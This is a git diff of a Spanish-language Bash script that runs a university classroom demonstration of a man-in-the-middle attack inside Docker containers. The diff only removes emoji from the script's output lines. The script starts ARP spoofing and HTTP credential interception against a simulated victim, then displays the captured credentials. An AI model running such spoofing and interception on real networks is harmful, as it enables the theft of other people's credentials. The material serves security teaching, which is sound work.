@@ -18,32 +18,32 @@ NC='\033[0m' # No Color
 # Banner
 echo -e "${CYAN}"
 cat << "EOF"
-╔════════════════════════════════════════════════════════════╗
-║     Man-in-the-Middle Attack Demonstration                 ║
-║     Universidad Nacional de Colombia - Sede Medellín       ║
-║     Criptografía y Seguridad - Grupo 6                     ║
-╚════════════════════════════════════════════════════════════╝
+
+     Man-in-the-Middle Attack Demonstration                 
+     Universidad Nacional de Colombia - Sede Medellín       
+     Criptografía y Seguridad - Grupo 6                     
+
 EOF
 echo -e "${NC}"
 
-echo -e "${RED}⚠️  ADVERTENCIA: USO EDUCATIVO ÚNICAMENTE${NC}"
+echo -e "${RED}  ADVERTENCIA: USO EDUCATIVO ÚNICAMENTE${NC}"
 echo -e "${YELLOW}Este script ejecuta un ataque MitM en un entorno controlado.${NC}"
 echo ""
 
 # Verificar que estamos en el directorio correcto
 if [ ! -f "mitm-demo/docker-compose.yml" ]; then
-    echo -e "${RED}❌ Error: Ejecuta este script desde el directorio raíz del proyecto${NC}"
+    echo -e "${RED} Error: Ejecuta este script desde el directorio raíz del proyecto${NC}"
     exit 1
 fi
 
 cd mitm-demo
 
-echo -e "${BLUE}📋 Verificando Docker...${NC}"
+echo -e "${BLUE} Verificando Docker...${NC}"
 if ! docker compose version &> /dev/null; then
-    echo -e "${RED}❌ Docker Compose no está instalado${NC}"
+    echo -e "${RED} Docker Compose no está instalado${NC}"
     exit 1
 fi
-echo -e "${GREEN}✅ Docker Compose disponible${NC}"
+echo -e "${GREEN} Docker Compose disponible${NC}"
 echo ""
 
 # Función para esperar
@@ -56,14 +56,14 @@ wait_for_service() {
     
     while [ $attempt -lt $max_attempts ]; do
         if sudo docker compose ps | grep -q "$service.*running\|$service.*healthy"; then
-            echo -e "${GREEN}✅ $service está listo${NC}"
+            echo -e "${GREEN} $service está listo${NC}"
             return 0
         fi
         attempt=$((attempt + 1))
         sleep 1
     done
     
-    echo -e "${YELLOW}⚠️  $service tardó en iniciar, pero continuando...${NC}"
+    echo -e "${YELLOW}  $service tardó en iniciar, pero continuando...${NC}"
     return 0
 }
 
@@ -78,10 +78,10 @@ read -p "Opción [1-4]: " option
 
 case $option in
     1)
-        echo -e "\n${GREEN}🚀 Iniciando demo completa automatizada...${NC}\n"
+        echo -e "\n${GREEN} Iniciando demo completa automatizada...${NC}\n"
         
         # Paso 1: Levantar contenedores
-        echo -e "${BLUE}📦 Paso 1/6: Levantando contenedores Docker...${NC}"
+        echo -e "${BLUE} Paso 1/6: Levantando contenedores Docker...${NC}"
         sudo docker compose up -d
         echo ""
         
@@ -92,40 +92,40 @@ case $option in
         echo ""
         
         # Paso 2: Verificar conectividad
-        echo -e "${BLUE}🔍 Paso 2/6: Verificando conectividad...${NC}"
+        echo -e "${BLUE} Paso 2/6: Verificando conectividad...${NC}"
         sudo sudo docker compose exec -T victim ping -c 2 172.20.0.30 > /dev/null 2>&1
-        echo -e "${GREEN}✅ Conectividad verificada${NC}"
+        echo -e "${GREEN} Conectividad verificada${NC}"
         echo ""
         
         # Paso 3: Mostrar estado inicial
-        echo -e "${BLUE}📊 Paso 3/6: Estado inicial de la red${NC}"
+        echo -e "${BLUE} Paso 3/6: Estado inicial de la red${NC}"
         echo -e "${CYAN}Tabla ARP de la víctima (antes del ataque):${NC}"
         sudo docker compose exec -T victim arp -a
         echo ""
         
         # Paso 4: Iniciar ARP spoofing en background
-        echo -e "${BLUE}🎯 Paso 4/6: Iniciando ARP spoofing...${NC}"
+        echo -e "${BLUE} Paso 4/6: Iniciando ARP spoofing...${NC}"
         sudo docker compose exec -d attacker python3 /scripts/arp_spoof.py \
             --victim 172.20.0.10 \
             --gateway 172.20.0.1 \
             --interface eth0
         
-        echo -e "${GREEN}✅ ARP spoofing iniciado${NC}"
+        echo -e "${GREEN} ARP spoofing iniciado${NC}"
         sleep 3
         echo ""
         
         # Paso 5: Iniciar interceptación HTTP en background
-        echo -e "${BLUE}🕵️  Paso 5/6: Iniciando interceptación HTTP...${NC}"
+        echo -e "${BLUE}  Paso 5/6: Iniciando interceptación HTTP...${NC}"
         sudo docker compose exec -d attacker python3 /scripts/intercept_http.py \
             --interface eth0 \
             --log /logs/intercepted_credentials.txt
         
-        echo -e "${GREEN}✅ Interceptación HTTP iniciada${NC}"
+        echo -e "${GREEN} Interceptación HTTP iniciada${NC}"
         sleep 2
         echo ""
         
         # Paso 6: Víctima navega y envía credenciales
-        echo -e "${BLUE}👤 Paso 6/6: Víctima navegando y enviando credenciales...${NC}"
+        echo -e "${BLUE} Paso 6/6: Víctima navegando y enviando credenciales...${NC}"
         echo -e "${YELLOW}(La víctima no sabe que está siendo interceptada)${NC}"
         echo ""
         
@@ -136,33 +136,33 @@ case $option in
         sleep 3
         
         # Mostrar resultados
-        echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
-        echo -e "${RED}🔓 CREDENCIALES INTERCEPTADAS:${NC}"
-        echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
+        echo -e "${CYAN}${NC}"
+        echo -e "${RED} CREDENCIALES INTERCEPTADAS:${NC}"
+        echo -e "${CYAN}${NC}"
         
         if sudo docker compose exec -T attacker test -f /logs/intercepted_credentials.txt; then
             sudo docker compose exec -T attacker cat /logs/intercepted_credentials.txt
         else
-            echo -e "${YELLOW}⚠️  Archivo de credenciales aún no creado${NC}"
+            echo -e "${YELLOW}  Archivo de credenciales aún no creado${NC}"
         fi
         
-        echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
+        echo -e "${CYAN}${NC}"
         echo ""
         
         # Mostrar tabla ARP modificada
-        echo -e "${BLUE}📊 Tabla ARP de la víctima (después del ataque):${NC}"
+        echo -e "${BLUE} Tabla ARP de la víctima (después del ataque):${NC}"
         sudo docker compose exec -T victim arp -a
         echo ""
         
         # Resumen
-        echo -e "${GREEN}✅ Demo completada exitosamente!${NC}"
+        echo -e "${GREEN} Demo completada exitosamente!${NC}"
         echo ""
-        echo -e "${CYAN}📋 Resumen:${NC}"
-        echo "  1. ✅ ARP spoofing ejecutado"
-        echo "  2. ✅ Tráfico HTTP interceptado"
-        echo "  3. ✅ Credenciales capturadas"
+        echo -e "${CYAN} Resumen:${NC}"
+        echo "  1.  ARP spoofing ejecutado"
+        echo "  2.  Tráfico HTTP interceptado"
+        echo "  3.  Credenciales capturadas"
         echo ""
-        echo -e "${BLUE}📁 Archivos generados:${NC}"
+        echo -e "${BLUE} Archivos generados:${NC}"
         echo "  - Logs: ../evidencias/logs/intercepted_credentials.txt"
         echo "  - Capturas: ../evidencias/pcap_files/"
         echo ""
@@ -175,9 +175,9 @@ case $option in
         ;;
         
     2)
-        echo -e "\n${GREEN}🚀 Modo paso a paso...${NC}\n"
+        echo -e "\n${GREEN} Modo paso a paso...${NC}\n"
         
-        echo -e "${BLUE}📦 Levantando contenedores...${NC}"
+        echo -e "${BLUE} Levantando contenedores...${NC}"
         docker compose up -d
         echo ""
         
@@ -186,7 +186,7 @@ case $option in
         wait_for_service "attacker"
         echo ""
         
-        echo -e "${GREEN}✅ Entorno listo${NC}"
+        echo -e "${GREEN} Entorno listo${NC}"
         echo ""
         echo -e "${CYAN}Sigue estos pasos en terminales separadas:${NC}"
         echo ""
@@ -209,12 +209,12 @@ case $option in
         ;;
         
     3)
-        echo -e "\n${GREEN}🚀 Levantando entorno...${NC}\n"
+        echo -e "\n${GREEN} Levantando entorno...${NC}\n"
         docker compose up -d
         echo ""
         docker compose ps
         echo ""
-        echo -e "${GREEN}✅ Entorno levantado${NC}"
+        echo -e "${GREEN} Entorno levantado${NC}"
         echo ""
         echo -e "${BLUE}Accede al servidor web:${NC}"
         echo "  http://localhost:8080"
@@ -222,26 +222,26 @@ case $option in
         ;;
         
     4)
-        echo -e "\n${YELLOW}🧹 Deteniendo y limpiando...${NC}\n"
+        echo -e "\n${YELLOW} Deteniendo y limpiando...${NC}\n"
         sudo docker compose down
         echo ""
-        echo -e "${GREEN}✅ Entorno detenido${NC}"
+        echo -e "${GREEN} Entorno detenido${NC}"
         echo ""
         read -p "¿Eliminar también los logs y capturas? (y/N): " clean_logs
         if [[ "$clean_logs" =~ ^[Yy]$ ]]; then
             rm -f ../evidencias/logs/*.txt
             rm -f ../evidencias/pcap_files/*.pcap
-            echo -e "${GREEN}✅ Logs y capturas eliminados${NC}"
+            echo -e "${GREEN} Logs y capturas eliminados${NC}"
         fi
         ;;
         
     *)
-        echo -e "${RED}❌ Opción inválida${NC}"
+        echo -e "${RED} Opción inválida${NC}"
         exit 1
         ;;
 esac
 
 echo ""
-echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}${NC}"
 echo -e "${GREEN}Gracias por usar la demo de MitM${NC}"
-echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}${NC}"
